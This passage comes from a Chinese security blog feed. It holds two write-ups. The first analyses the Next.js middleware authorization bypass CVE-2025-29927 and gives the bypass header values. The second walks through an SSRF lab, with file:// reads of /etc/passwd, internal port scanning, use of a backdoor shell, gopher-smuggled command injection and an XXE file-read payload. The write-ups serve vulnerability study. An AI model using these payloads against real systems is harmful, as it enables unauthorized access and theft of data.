class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 异步运行中间件的方法。</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> params - 包含运行中间件所需参数的对象。</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> params.request - 传入的 HTTP 请求对象。</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> params.response - 对应的 HTTP 响应对象。</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> params.parsedUrl - 解析后的 Next.js URL 对象。</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> params.parsed - 解析后的 URL 查询参数对象。</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> params.onWarning - 可选的警告处理函数，当出现警告时会被调用。</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@returns</span> 一个 Promise，解析为 FetchEventResult 或 null。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">protected</span> async runMiddleware(params: &#123;<br>    request: IncomingMessage;<br>    response: ServerResponse;<br>    parsedUrl: ParsedNextUrl;<br>    parsed: UrlWithParsedQuery;<br>    onWarning?: (warning: Error) =&gt; void;<br>&#125;): Promise&lt;FetchEventResult | <span class="hljs-literal">null</span>&gt; &#123;<br>    <span class="hljs-comment">// 调用中间件的 Beta 版本警告函数，该函数使用 execOnce 确保只执行一次。</span><br>    <span class="hljs-comment">// 此警告用于提醒开发者当前使用的是 Next.js 中间件的 Beta 版本，不保证遵循语义化版本控制。</span><br>    <span class="hljs-keyword">this</span>.middlewareBetaWarning();<br><br>    <span class="hljs-comment">// 初始化一个对象，用于存储当前匹配的页面信息，包括页面名称和参数</span><br>    <span class="hljs-keyword">const</span> page: &#123; name?: string; params?: &#123; [key: string]: string &#125; &#125; = &#123;&#125;;<br>    <span class="hljs-comment">// 检查请求的路径是否对应一个存在的页面</span><br>    <span class="hljs-keyword">if</span> (await <span class="hljs-keyword">this</span>.hasPage(params.parsedUrl.pathname)) &#123;<br>        <span class="hljs-comment">// 如果存在，将该页面的名称赋值给 page 对象</span><br>        page.name = params.parsedUrl.pathname;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.dynamicRoutes) &#123;<br>        <span class="hljs-comment">// 如果请求的路径不是一个普通页面，检查动态路由</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> dynamicRoute of <span class="hljs-keyword">this</span>.dynamicRoutes) &#123;<br>            <span class="hljs-comment">// 尝试匹配动态路由</span><br>            <span class="hljs-keyword">const</span> matchParams = dynamicRoute.match(params.parsedUrl.pathname);<br>            <span class="hljs-keyword">if</span> (matchParams) &#123;<br>                <span class="hljs-comment">// 如果匹配成功，将动态路由对应的页面名称和匹配参数赋值给 page 对象</span><br>                page.name = dynamicRoute.page;<br>                page.params = matchParams;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 从请求头中获取 &#x27;x-middleware-subrequest&#x27; 字段的值</span><br>    <span class="hljs-keyword">const</span> subreq = params.request.headers[`x-middleware-subrequest`];<br>    <span class="hljs-comment">// 如果该字段存在且为字符串类型，则按冒号分割成数组，否则为空数组</span><br>    <span class="hljs-keyword">const</span> subrequests = typeof subreq === <span class="hljs-string">&#x27;string&#x27;</span> ? subreq.split(<span class="hljs-string">&#x27;:&#x27;</span>) : [];<br>    <span class="hljs-comment">// 初始化一个 Headers 对象，用于合并所有中间件的响应头</span><br>    <span class="hljs-keyword">const</span> allHeaders = new Headers();<br>    <span class="hljs-comment">// 初始化结果变量，用于存储中间件运行的结果</span><br>    let result: FetchEventResult | <span class="hljs-literal">null</span> = <span class="hljs-literal">null</span>;<br><br>    <span class="hljs-comment">// 遍历所有中间件</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> middleware of <span class="hljs-keyword">this</span>.middleware || []) &#123;<br>        <span class="hljs-comment">// 检查当前中间件是否匹配请求的路径</span><br>        <span class="hljs-keyword">if</span> (middleware.match(params.parsedUrl.pathname)) &#123;<br>            <span class="hljs-comment">// 检查当前中间件对应的边缘函数是否存在</span><br>            <span class="hljs-keyword">if</span> (!(await <span class="hljs-keyword">this</span>.hasMiddleware(middleware.page, middleware.ssr))) &#123;<br>                <span class="hljs-comment">// 如果不存在，输出警告信息并跳过该中间件</span><br>                console.warn(`The Edge Function <span class="hljs-keyword">for</span> $&#123;middleware.page&#125; was not found`);<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br><br>            <span class="hljs-comment">// 确保中间件已经准备好可以运行</span><br>            await <span class="hljs-keyword">this</span>.ensureMiddleware(middleware.page, middleware.ssr);<br><br>            <span class="hljs-comment">// 获取当前中间件的信息</span><br>            <span class="hljs-keyword">const</span> middlewareInfo = getMiddlewareInfo(&#123;<br>                dev: <span class="hljs-keyword">this</span>.renderOpts.dev,<br>                distDir: <span class="hljs-keyword">this</span>.distDir,<br>                page: middleware.page,<br>                serverless: <span class="hljs-keyword">this</span>._isLikeServerless,<br>            &#125;);<br><br>            <span class="hljs-comment">// 检查当前中间件是否在子请求列表中</span><br>            <span class="hljs-keyword">if</span> (subrequests.includes(middlewareInfo.name)) &#123;<br>                <span class="hljs-comment">// 如果在，创建一个默认的响应结果并跳过该中间件的执行</span><br>                result = &#123;<br>                    response: NextResponse.next(),<br>                    waitUntil: Promise.resolve(),<br>                &#125;;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br><br>            <span class="hljs-comment">// 运行当前中间件</span><br>            result = await run(&#123;<br>                name: middlewareInfo.name,<br>                paths: middlewareInfo.paths,<br>                request: &#123;<br>                    headers: params.request.headers,<br>                    method: params.request.method || <span class="hljs-string">&#x27;GET&#x27;</span>,<br>                    nextConfig: &#123;<br>                        basePath: <span class="hljs-keyword">this</span>.nextConfig.basePath,<br>                        i18n: <span class="hljs-keyword">this</span>.nextConfig.i18n,<br>                        trailingSlash: <span class="hljs-keyword">this</span>.nextConfig.trailingSlash,<br>                    &#125;,<br>                    url: getRequestMeta(params.request, <span class="hljs-string">&#x27;__NEXT_INIT_URL&#x27;</span>)!,<br>                    page: page,<br>                &#125;,<br>                useCache: !<span class="hljs-keyword">this</span>.nextConfig.experimental.concurrentFeatures,<br>                onWarning: (warning: Error) =&gt; &#123;<br>                    <span class="hljs-keyword">if</span> (params.onWarning) &#123;<br>                        <span class="hljs-comment">// 如果有警告处理函数，添加中间件名称到警告信息中并调用该函数</span><br>                        warning.message += ` <span class="hljs-string">&quot;./<span class="hljs-subst">$&#123;middlewareInfo.name&#125;</span>&quot;</span>`;<br>                        params.onWarning(warning);<br>                    &#125;<br>                &#125;,<br>            &#125;);<br><br>            <span class="hljs-comment">// 遍历中间件响应的所有头部信息</span><br>            <span class="hljs-keyword">for</span> (let [key, value] of result.response.headers) &#123;<br>                <span class="hljs-comment">// 排除 &#x27;x-middleware-next&#x27; 头部，将其他头部信息添加到 allHeaders 中</span><br>                <span class="hljs-keyword">if</span> (key!== <span class="hljs-string">&#x27;x-middleware-next&#x27;</span>) &#123;<br>                    allHeaders.append(key, value);<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">this</span>.renderOpts.dev) &#123;<br>                <span class="hljs-comment">// 在非开发环境下，捕获中间件异步操作的错误并输出错误信息</span><br>                result.waitUntil.<span class="hljs-keyword">catch</span>((error) =&gt; &#123;<br>                    console.error(`Uncaught: middleware waitUntil errored`, error);<br>                &#125;);<br>            &#125;<br><br>            <span class="hljs-comment">// 检查中间件响应头中是否包含 &#x27;x-middleware-next&#x27;</span><br>            <span class="hljs-keyword">if</span> (!result.response.headers.has(<span class="hljs-string">&#x27;x-middleware-next&#x27;</span>)) &#123;<br>                <span class="hljs-comment">// 如果不包含，说明不需要继续执行后续中间件，跳出循环</span><br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 如果没有任何中间件产生结果</span><br>    <span class="hljs-keyword">if</span> (!result) &#123;<br>        <span class="hljs-comment">// 渲染 404 页面</span><br>        <span class="hljs-keyword">this</span>.render404(params.request, params.response, params.parsed);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// 将合并后的头部信息设置到最终结果的响应头中</span><br>        <span class="hljs-keyword">for</span> (let [key, value] of allHeaders) &#123;<br>            result.response.headers.<span class="hljs-keyword">set</span>(key, value);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 返回最终的中间件运行结果</span><br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>该框架的旧版本（v12.0.7）存在一段代码</p><p>1.当 next.js 应用程序使用中间件时，将使用runMiddleware函数<br>2.runMiddleware函数会检索x-middleware-subrequest头的Value<br>使用Value来判断是否需要应用中间件</p><p>1.具体而言：x-middleware-subrequest头的Value被拆分并使用:作为分隔符创建一个列表<br>2.检查此列表是否包含middlewareInfo.name值<br>3.这意味着，如果我们将有正确Value的x-middleware-subrequest头添加到请求中，中间件将被完全忽略，并且请求将通过转发NextResponse.next()并成功访问路径，而中间件不会对其产生任何影响。</p><p>为了成功未授权访问，x-middleware-subrequest的Value必须包含middlewareInfo.name</p><h4 id="1-middlewareInfo-name"><a href="#1-middlewareInfo-name" class="headerlink" title="1.middlewareInfo.name"></a>1.middlewareInfo.name</h4><p>middlewareInfo.name的值完全可以猜测，它只是中间件所在的路径。要知道这一点，有必要快速了解一下旧版本中中间件的配置方式。</p><p>首先，在版本 12.2之前，该文件必须命名为 _middleware.ts。</p><p>此外，approuter 仅在 Next.js 版本 13 中发布。此前唯一存在的 router 就是 pages router ，因此该文件必须放在pages文件夹中（router specific）。</p><p>这些信息使我们能够推断出中间件的确切路径，从而猜测出x-middleware-subrequest头的值，后者仅由目录名称和文件名称组成，遵循当时的约定，以下划线开头：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">x-middleware-subrequest: pages/_middleware<br></code></pre></td></tr></table></figure><p>这样便可以完全绕过中间件，从而绕过任何基于它的保护系统</p><p>但还需要考虑执行顺序问题</p><h4 id="2-执行顺序"><a href="#2-执行顺序" class="headerlink" title="2.执行顺序"></a>2.执行顺序</h4><p>12.2 之前的版本允许嵌套路由将一个或多个<code>_middleware</code>文件放置在树中的任何位置（从<code>pages</code>文件夹开始），并且具有执行顺序</p><p><img src="/images/next.js/9a2d3e47f55c82a44d04345781818f58.png" alt="img"></p><p>因此，要获得对<code>/dashboard/panel/admin</code>（受中间件保护的）的访问权限，关于<code>middlewareInfo.name</code>的值有三种可能性，因此 <code>x-middleware-subrequest</code> 的值也有三种可能性：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">pages/_middleware<br><br>pages/dashboard/_middleware<br><br>pages/dashboard/panel/_middleware<br></code></pre></td></tr></table></figure><h3 id="新版本代码-12-2之后"><a href="#新版本代码-12-2之后" class="headerlink" title="新版本代码 - 12.2之后"></a>新版本代码 - 12.2之后</h3><p>从版本 12.2 开始，该文件不再包含下划线，而必须简单地命名为<code>middleware.ts</code></p><p>此外，它不能再位于 <code>pages</code> 文件夹中</p><p>1.有效Payload：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-attribute">x</span>-middleware-subrequest: middleware<br></code></pre></td></tr></table></figure><p>2.&#x2F;src 目录</p><p>还应该考虑到 Next.js 提供了创建<code>/src</code>目录的可能性</p><p>除了在项目根目录中放置特殊的 Next.js 应用程序或页面目录外，Next.js 还支持将应用程序代码放置在 src 目录下的常见模式。<a href="https://nextjs.org/docs/app/building-your-application/configuring/src-directory">Next.js文档</a></p><p>在这种情况下，有效Payload将是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">x-middleware-subrequest: src/middleware<br></code></pre></td></tr></table></figure><p>因此，无论路径有多少层，总共只有两种可能性</p><h4 id="新版本逻辑变动代码"><a href="#新版本逻辑变动代码" class="headerlink" title="新版本逻辑变动代码"></a>新版本逻辑变动代码</h4><p><img src="/images/next.js/image-20250410102039484.png" alt="image-20250410102039484"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 导出一个异步函数 `run`，它使用 `withTaggedErrors` 包装，目的是为错误添加标签以便于调试和追踪。</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> <span class="hljs-variable">params</span> - 运行中间件所需的参数对象。</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@returns</span> 一个 Promise，解析为中间件运行的结果。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> run = <span class="hljs-title function_">withTaggedErrors</span>(<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">runWithTaggedErrors</span>(<span class="hljs-params">params</span>) &#123;<br>    <span class="hljs-comment">// 调用 `getRuntimeContext` 函数获取运行时上下文，该上下文包含了中间件运行所需的环境信息等。</span><br>    <span class="hljs-comment">// 此操作是异步的，会等待结果返回后再继续执行后续代码。</span><br>    <span class="hljs-keyword">const</span> runtime = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getRuntimeContext</span>(params);<br><br>    <span class="hljs-comment">// 从请求头中获取 `x-middleware-subrequest` 字段的值。</span><br>    <span class="hljs-comment">// 这个字段可能包含了需要跳过执行的中间件名称列表，也可能用于记录递归调用的中间件信息。</span><br>    <span class="hljs-keyword">const</span> subreq = params.<span class="hljs-property">request</span>.<span class="hljs-property">headers</span>[<span class="hljs-string">`x-middleware-subrequest`</span>];<br><br>    <span class="hljs-comment">// 判断 `subreq` 是否为字符串类型。</span><br>    <span class="hljs-comment">// 如果是字符串，则按冒号 `:` 分割成数组；如果不是字符串，则将 `subrequests` 设为空数组。</span><br>    <span class="hljs-comment">// 这样做是为了将可能存在的多个中间件名称解析出来。</span><br>    <span class="hljs-keyword">const</span> subrequests = <span class="hljs-keyword">typeof</span> subreq === <span class="hljs-string">&#x27;string&#x27;</span> ? subreq.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;:&#x27;</span>) : [];<br><br>    <span class="hljs-comment">// 定义最大递归深度，用于限制中间件递归调用的次数，避免无限递归导致栈溢出。</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">MAX_RECURSION_DEPTH</span> = <span class="hljs-number">5</span>;<br><br>    <span class="hljs-comment">// 计算当前中间件在 `subrequests` 数组中出现的次数，即递归调用的深度。</span><br>    <span class="hljs-comment">// `reduce` 方法会遍历 `subrequests` 数组，对于每个元素，如果其等于当前中间件的名称 `params.name`，则累加器 `acc` 加 1。</span><br>    <span class="hljs-keyword">const</span> depth = subrequests.<span class="hljs-title function_">reduce</span>(<br>        <span class="hljs-function">(<span class="hljs-params">acc, curr</span>) =&gt;</span> (curr === params.<span class="hljs-property">name</span> ? acc + <span class="hljs-number">1</span> : acc),<br>        <span class="hljs-number">0</span><br>    );<br>&#125;);<br></code></pre></td></tr></table></figure><p>常量depth的值必须大于或等于常量MAX_RECURSION_DEPTH的值 （即5）</p><p>每当subrequests（即用:分隔的Value的列表）中的其中一个Value等于中间件路径即params.name时，常量depth就会加 1</p><p>而params.name跟之前一样，只有两种可能性：middleware&#x2F;src&#x2F;middleware</p><p>因此，我们只需要在请求中添加以下标头&#x2F;值即可绕过中间件：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-attribute">x-middleware-subrequest</span>: <span class="hljs-attribute">middleware</span>:<span class="hljs-attribute">middleware</span>:<span class="hljs-attribute">middleware</span>:<span class="hljs-attribute">middleware</span>:middleware<br></code></pre></td></tr></table></figure><p>或</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware<br></code></pre></td></tr></table></figure><p>payload解释：这是<a href="https://nextjs.org/blog/cve-2025-29927">为了防止递归请求</a>陷入无限循环。</p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>升级到不受影响版本</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/Dalock/article/details/146492231">Next.js 中间件鉴权绕过漏洞 (CVE-2025-29927) 复现利用与原理分析_cve-2025-29927复现-CSDN博客</a></p><p><a href="https://github.com/vercel/next.js">vercel&#x2F;next.js: The React Framework</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>next.js-中间件鉴权绕过</tag>
      
      <tag>CVE-2025-29927</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ssrf-vul-for-new</title>
    <link href="/2025/04/03/ssrf-vul-for-new/"/>
    <url>/2025/04/03/ssrf-vul-for-new/</url>
    
    <content type="html"><![CDATA[<h2 id="SSRF打穿内网"><a href="#SSRF打穿内网" class="headerlink" title="SSRF打穿内网"></a>SSRF打穿内网</h2><h2 id="靶场拓扑设计"><a href="#靶场拓扑设计" class="headerlink" title="靶场拓扑设计"></a>靶场拓扑设计</h2><p><img src="/images/ssrf-vul-for-new/%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6-1743649004960-6.png" alt="未命名文件"></p><p>攻击流程，172.150.23.21 这个服务器的 Web 80 端口存在 SSRF 漏洞，并且 80 端口映射到了公网的 9080，此时攻击者通过这个 9080 端口可以借助 SSRF 漏洞发起对 172 目标内网的探测和攻击。</p><h2 id="1-判断目标站点是否存在SSRF"><a href="#1-判断目标站点是否存在SSRF" class="headerlink" title="1.判断目标站点是否存在SSRF"></a>1.判断目标站点是否存在SSRF</h2><p>访问目标站点</p><p>是一个带爬取网站首页的功能网站</p><p><img src="/images/ssrf-vul-for-new/image-20250329164520961.png" alt="image-20250329164520961"></p><p>这里访问<a href="http://127.0.0.1/">http://127.0.0.1</a> 发现页面返回了网站首页</p><p><img src="/images/ssrf-vul-for-new/image-20250329165403207.png" alt="image-20250329165403207"></p><p>并且我们的bp检测SSRF插件也显示此站点url处疑似存在SSRF漏洞</p><p><img src="/images/ssrf-vul-for-new/image-20250329165639501.png" alt="image-20250329165639501"></p><h2 id="2-尝试获取本地信息"><a href="#2-尝试获取本地信息" class="headerlink" title="2.尝试获取本地信息"></a>2.尝试获取本地信息</h2><h3 id="先判断目标机器操作系统"><a href="#先判断目标机器操作系统" class="headerlink" title="先判断目标机器操作系统"></a>先判断目标机器操作系统</h3><p>配合file协议 探测目标操作系统</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">linux:</span><span class="hljs-keyword">/etc/</span>passwd<br><span class="hljs-symbol">windows:</span><span class="hljs-keyword">/system32/</span>win.ini<br></code></pre></td></tr></table></figure><p>显示为linux，并且成功读取到了&#x2F;etc&#x2F;passwd信息</p><h3 id="尝试获取目标内网地址"><a href="#尝试获取目标内网地址" class="headerlink" title="尝试获取目标内网地址"></a><img src="/images/ssrf-vul-for-new/image-20250329170049306.png" alt="image-20250329170049306">尝试获取目标内网地址</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/</span>hosts<br>权限高的情况下还可以尝试读取 <span class="hljs-regexp">/proc/</span>net<span class="hljs-regexp">/arp 或者 /</span>etc<span class="hljs-regexp">/network/i</span>nterfaces 来判断当前机器的网络情况<br></code></pre></td></tr></table></figure><p>获取到目标内网地址为 172.150.23.21</p><p><img src="/images/ssrf-vul-for-new/image-20250329170429456.png" alt="image-20250329170429456"></p><h2 id="3-利用SSRF探测内网端口"><a href="#3-利用SSRF探测内网端口" class="headerlink" title="3.利用SSRF探测内网端口"></a>3.利用SSRF探测内网端口</h2><p>SSRF 常配合 DICT 协议探测内网端口开放情况，但不是所有的端口都可以被探测，一般只能探测出一些带 TCP <strong>回显的端口</strong></p><h3 id="bp下使用迭代器爆破模块，设置好爆破的ip和端口号批量探测"><a href="#bp下使用迭代器爆破模块，设置好爆破的ip和端口号批量探测" class="headerlink" title="bp下使用迭代器爆破模块，设置好爆破的ip和端口号批量探测"></a>bp下使用迭代器爆破模块，设置好爆破的ip和端口号批量探测</h3><p>这里由于上帝视角，仅进行C段信息探测</p><p><img src="/images/ssrf-vul-for-new/image-20250329183858875.png" alt="image-20250329183858875"></p><p><img src="/images/ssrf-vul-for-new/image-20250329183802091.png" alt="image-20250329183802091"></p><p><img src="/images/ssrf-vul-for-new/image-20250329185409410.png" alt="image-20250329185409410"></p><h3 id="整理好内网ip及端口开放情况"><a href="#整理好内网ip及端口开放情况" class="headerlink" title="整理好内网ip及端口开放情况"></a>整理好内网ip及端口开放情况</h3><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">可能有误<br><span class="hljs-number">172.150.23.21</span> - <span class="hljs-number">80</span><br><span class="hljs-number">172.150.23.22</span> - <span class="hljs-number">80</span><br><span class="hljs-number">172.150.23.23</span> - <span class="hljs-number">80</span> <span class="hljs-number">3306</span><br><span class="hljs-number">172.150.23.24</span> - <span class="hljs-number">80</span><br><span class="hljs-number">172.150.23.25</span> - <span class="hljs-number">80</span><br><span class="hljs-number">172.150.23.26</span> - <span class="hljs-number">8080</span><br><span class="hljs-number">172.150.23.27</span> - <span class="hljs-number">6379</span><br><span class="hljs-number">172.150.23.28</span> - <span class="hljs-number">80</span> <span class="hljs-number">6379</span><br><span class="hljs-number">172.150.23.29</span> - <span class="hljs-number">80</span> <span class="hljs-number">3306</span><br><br><br><br></code></pre></td></tr></table></figure><h2 id="4-172-150-23-22-RCE"><a href="#4-172-150-23-22-RCE" class="headerlink" title="4.172.150.23.22 - RCE"></a>4.172.150.23.22 - RCE</h2><p>访问172.150.23.22</p><p><img src="/images/ssrf-vul-for-new/image-20250329185948599.png" alt="image-20250329185948599"></p><p>转到目录扫描 依旧是爆破模块fuzz一下目录字典</p><p>可以发现目录下存在 shell.php phpinfo.php index.php</p><p><img src="/images/ssrf-vul-for-new/image-20250329195003316.png" alt="image-20250329195003316"></p><p>访问shell.php</p><p>你妹的，竟然是后门命令执行文件 </p><h4 id="这里要注意一个点"><a href="#这里要注意一个点" class="headerlink" title="这里要注意一个点"></a>这里要注意一个点</h4><p>因为是通过SSRF进行攻击的，所以在输入url的时候需要进行一次url的编码，进入bp时是两次url编码</p><p><img src="/images/ssrf-vul-for-new/image-20250329195140866.png" alt="image-20250329195140866"></p><p><img src="/images/ssrf-vul-for-new/image-20250329195353448.png" alt="image-20250329195353448"></p><p><img src="/images/ssrf-vul-for-new/image-20250329200159802.png" alt="image-20250329200159802"></p><p>访问phpinfo.php</p><p><img src="/images/ssrf-vul-for-new/image-20250329195448786.png" alt="image-20250329195448786"></p><h2 id="5-172-150-23-23-sql注入"><a href="#5-172-150-23-23-sql注入" class="headerlink" title="5.172.150.23.23 - sql注入"></a>5.172.150.23.23 - sql注入</h2><p>访问这个内网地址，发现是一个人员查询系统</p><p><img src="/images/ssrf-vul-for-new/image-20250330214255806.png" alt="image-20250330214255806"></p><p>在页面输入1，试试</p><p>oh !!! 发现了传参参数 ‘id’ ，很明显不能直接在这里输入值.</p><p>这里解释一下，由于我们是通过爬取这个站点获取内网信息的，所以在构造参数的时候不能在传入值输入，当前页面只接收url的值。</p><p>去看国光的wp可以吗？’H’</p><p>本人已经累了</p><p>我有机会再补上</p><h2 id="6-172-150-23-24-SSRF命令执行"><a href="#6-172-150-23-24-SSRF命令执行" class="headerlink" title="6.172.150.23.24 SSRF命令执行"></a>6.172.150.23.24 SSRF命令执行</h2><p>这里跟上面不太一样。之前的代码注入和 SQL 注入都是直接通过 GET 方式来传递参数进行攻击的，但是这个命令执行的场景是通过 POST 方式触发的，我们无法使用使用 SSRF 漏洞通过 HTTP 协议来传递 POST 数据，这种情况下一般就得利用 gopher 协议来发起对内网应用的 POST 请求了，gopher 的基本请求格式如下：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">gopher:</span>//&lt;host&gt;<span class="hljs-symbol">:&lt;port&gt;/&lt;gopher-path&gt;_&lt;tcp</span>数据流&gt;<br></code></pre></td></tr></table></figure><p>gopher 协议是一个古老且强大的协议，从请求格式可以看出来，可以传递最底层的 TCP 数据流，因为 HTTP 协议也是属于 TCP 数据层的，所以通过 gopher 协议传递 HTTP 的 POST 请求也是轻而易举的。</p><h3 id="两次-URL-编码后的数据就最终的-TCP-数据流"><a href="#两次-URL-编码后的数据就最终的-TCP-数据流" class="headerlink" title="两次 URL 编码后的数据就最终的 TCP 数据流"></a>两次 URL 编码后的数据就最终的 TCP 数据流</h3><p>访问站点，是一个ping 功能网络测试接口</p><p><img src="/images/ssrf-vul-for-new/image-20250331100527552.png" alt="image-20250331100527552"></p><p>首先来抓取正常情况下 POST 请求的数据包，删除掉 HTTP 请求的这一行：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">Accept</span>-Encoding: gzip, deflate, br<br></code></pre></td></tr></table></figure><p>记得把长度改成  27！。</p><p><img src="/images/ssrf-vul-for-new/image-20250331143140999.png" alt="image-20250331143140999"></p><p>再把这个数据包进行二次URL编码</p><p><img src="/images/ssrf-vul-for-new/image-20250331143256798.png" alt="image-20250331143256798"></p><p>把构造好的数据包放到gopher的特定位置，发包成功回显</p><p><img src="/images/ssrf-vul-for-new/image-20250331143350554.png" alt="image-20250331143350554"></p><h2 id="7-172-72-23-25-XML-实体注入"><a href="#7-172-72-23-25-XML-实体注入" class="headerlink" title="7.172.72.23.25 - XML 实体注入"></a>7.172.72.23.25 - XML 实体注入</h2><p>本场景是一个基础的 XXE 外部实体注入场景，登录的时候用户提交的 XML 数据，且服务器后端对 XML 数据解析并将结果输出，所以可以构造一个 XXE 读取本地的敏感信息</p><p>访问这个网站。尝试 读取本地的敏感信息</p><p><img src="/images/ssrf-vul-for-new/image-20250331155209476.png" alt="image-20250331155209476"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding= <span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">user</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY u <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/hosts&quot;</span> &gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;u;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><p>把所要传输的数据进行修改，两次URL打包</p><p><img src="/images/ssrf-vul-for-new/image-20250403102246954.png" alt="image-20250403102246954"></p><p><img 